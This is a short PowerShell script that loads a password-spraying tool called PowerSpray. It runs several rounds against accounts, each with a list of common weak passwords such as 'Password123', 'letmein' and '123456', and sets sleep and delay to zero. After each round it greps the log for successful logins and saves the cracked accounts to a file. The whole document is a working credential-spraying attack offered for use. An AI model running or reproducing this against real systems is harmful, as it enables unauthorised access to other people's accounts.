
Import-Module .\PowerSpray.ps1


function checkoutput {
cat brute_powerspray.log | Select-String "Successfully authenticated" | Get-Unique | Tee brute_powerspray_cracked.txt
}


PowerSpray -Sleep 0 -Delay 0 -Passwords "password" | Tee brute_powerspray.log 
checkoutput
PowerSpray -Sleep 0 -Delay 0 -Passwords "Password123,nimda,password1,Secret123,Password123!!,Eileen" | Tee brute_powerspray.log 
checkoutput
PowerSpray -Sleep 0 -Delay 0 -Passwords "111111,qwerty1234,qwertyuiop,password123,abc123,monkey,letmein" | Tee brute_powerspray.log 
checkoutput
PowerSpray -Sleep 0 -Delay 0 -Passwords "12345,123456,1234567,12345678,123456789,1234567890" | Tee brute_powerspray.log 
checkoutput

